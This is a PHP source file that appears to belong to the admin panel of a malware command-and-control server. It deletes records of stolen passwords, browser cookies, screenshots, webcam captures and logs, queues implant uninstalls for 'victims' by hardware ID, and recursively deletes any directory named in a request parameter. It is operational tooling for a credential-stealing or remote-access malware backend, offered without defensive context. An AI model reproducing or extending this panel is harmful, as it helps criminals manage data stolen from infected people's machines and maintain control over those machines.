<?php
	require('config.php');

	if (session_status() == PHP_SESSION_NONE) {
		session_start();
	}
	
	if (!isset($_SESSION['logged_in']) 
		|| $_SESSION['logged_in'] !== true) {
		header('Location: login.php');
		exit;
	}
	
	if(isset($_GET['type'])){
		$type = $_GET['type'];
		$id = (isset($_GET['id'])) ? $_GET['id'] : "";
	}else{
		header('Location: ' . $_SERVER['HTTP_REFERER']);
		exit;
	}

	$db = new mysqli($mysql_host, $mysql_user, $mysql_password) or die(__LINE__ . ' Invalid connect: ' . mysqli_error());
	$db->select_db($mysql_database) or die( "Unable to select database. Run setup first.");
	
	if($type == 'screen'){
		$stmt = $db->prepare("select screen,hwid from screens where hwid = ?");
		$stmt->bind_param("s", $id);
		$stmt->execute();
		$result = $stmt->get_result();
		
		while ($row = $result->fetch_array()) {
			$screen = $row['screen'];
			$hwid = $row['hwid'];
			unlink(__DIR__ . '/files/'.$hwid.'/'.$screen);
		}
		
		$stmt = $db->prepare("DELETE FROM screens WHERE hwid = ?");
		$stmt->bind_param("s", $id);
		$success = $stmt->execute();
		
		header('Location: ' . $_SERVER['HTTP_REFERER']);
		exit;
	}elseif ($type == 'log'){
		if(is_array($id) && sizeof($id)>0){
			foreach($id as $i){
				$stmt = $db->prepare("DELETE FROM logs WHERE log_id = ?");
				$stmt->bind_param("i", $i);
				$success = $stmt->execute();
			}
		}
		else{
			$stmt = $db->prepare("DELETE FROM logs WHERE log_id = ?");
			$stmt->bind_param("i", $id);
			$success = $stmt->execute();
		}
		header('Location: ' . $_SERVER['HTTP_REFERER']);
		exit;
	}elseif ($type == 'uninstall'){
		if(is_array($id) && sizeof($id)>0){
			foreach($id as $i){
				$zero = 0;
				$stmt = $db->prepare("select hwid from victims where id = ? LIMIT 1");
				$stmt->bind_param("i", $i);
				$stmt->execute();
				
				$hwid = $stmt->get_result()->fetch_assoc()['hwid'];
				echo $hwid . PHP_EOL;
				$stmt = $db->prepare("replace INTO uninstall(hwid, status) VALUES(?, ?)");
				$stmt->bind_param("si", $hwid, $zero );
				$success = $stmt->execute();			
				$stmt = $db->prepare("DELETE FROM victims WHERE id = ?");
				$stmt->bind_param("i", $i);
				$success = $stmt->execute();
			}
		}else{
			$zero = 0;
			$stmt = $db->prepare("select hwid from victims where id = ? LIMIT 1");
			$stmt->bind_param("i", $id);
			$stmt->execute();
			
			$hwid = $stmt->get_result()->fetch_assoc()['hwid'];
			echo $hwid . PHP_EOL;
			$stmt = $db->prepare("replace INTO uninstall(hwid, status) VALUES(?, ?)");
			$stmt->bind_param("si", $hwid, $zero );
			$success = $stmt->execute();			
			$stmt = $db->prepare("DELETE FROM victims WHERE id = ?");
			$stmt->bind_param("i", $id);
			$success = $stmt->execute();
		}
		header('Location: ' . $_SERVER['HTTP_REFERER']);
		exit;
	}elseif ($type == 'webcam'){
		$stmt = $db->prepare("DELETE FROM webcam WHERE hwid = ?");
		$stmt->bind_param("s", $id);
		$success = $stmt->execute();
		header('Location: ' . $_SERVER['HTTP_REFERER']);
		exit;
	}elseif ($type == 'password'){
		if(is_array($id) && sizeof($id)>0){
			foreach($id as $i){
				$stmt = $db->prepare("DELETE FROM passwords WHERE password_id = ?");
				$stmt->bind_param("i", $i);
				$success = $stmt->execute();
			}
		}
		else
		{
			$stmt = $db->prepare("DELETE FROM passwords WHERE password_id = ?");
			$stmt->bind_param("i", $id);
			$success = $stmt->execute();
		}
		
		header('Location: ' . $_SERVER['HTTP_REFERER']);
		exit;
	}elseif ($type == 'file'){
		$dir = dirname(urldecode($_GET['path']));

		$it = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS);
		$files = new RecursiveIteratorIterator($it,
					 RecursiveIteratorIterator::CHILD_FIRST);
		foreach($files as $file) {
			if ($file->isDir()){
				rmdir($file->getRealPath());
			} else {
				unlink($file->getRealPath());
			}
		}
		rmdir($dir);
	}elseif ($type == 'cookie'){
		$stmt = $db->prepare("select cookie,hwid from cookies where cookie_id = ? LIMIT 1");
		$stmt->bind_param("i", $id);
		$stmt->execute();
		$result = $stmt->get_result();
		
		while ($row = $result->fetch_array()) {
			$cookie = $row['cookie'];
			$hwid = $row['hwid'];
			unlink(__DIR__ . '/files/'.$hwid.'/'.$cookie);
		}
		
		$stmt = $db->prepare("DELETE FROM cookies WHERE cookie_id = ?");
		$stmt->bind_param("i", $id);
		$success = $stmt->execute();
		
		header('Location: ' . $_SERVER['HTTP_REFERER']);
		exit;
	}
?>